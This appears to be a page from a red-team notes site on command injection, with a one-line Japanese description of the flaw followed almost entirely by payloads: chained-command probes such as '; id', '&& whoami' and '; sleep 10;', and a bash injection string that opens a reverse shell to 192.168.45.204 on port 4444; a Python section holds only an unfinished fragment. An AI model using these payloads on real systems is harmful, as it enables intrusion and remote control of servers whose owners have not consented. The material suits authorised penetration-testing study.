---
title: Command Injection
parent: Web Attack
grand_parent: Red Team
---
# 概要

Webサーバなどの入力フォームがユーザの入力値をのままOSに渡してしまう脆弱性

## Vulnerability Check Command 

```bash
; id
```

```zsh
&& whoami
```

```zsh
|| whoami
```

```zsh
; sleep 10;
```

→ If vulnerable → [Reverse Shell](../03_initial_access/reverse_shell.md)

## ReverseShell

### bash

```bash
"; /bin/bash -c 'bash -i >& /dev/tcp/192.168.45.204/4444 0>&1' ; #"
```

### Python

```zsh
|| 
```

#### Example:
-  [git command](command-injection_git.md)


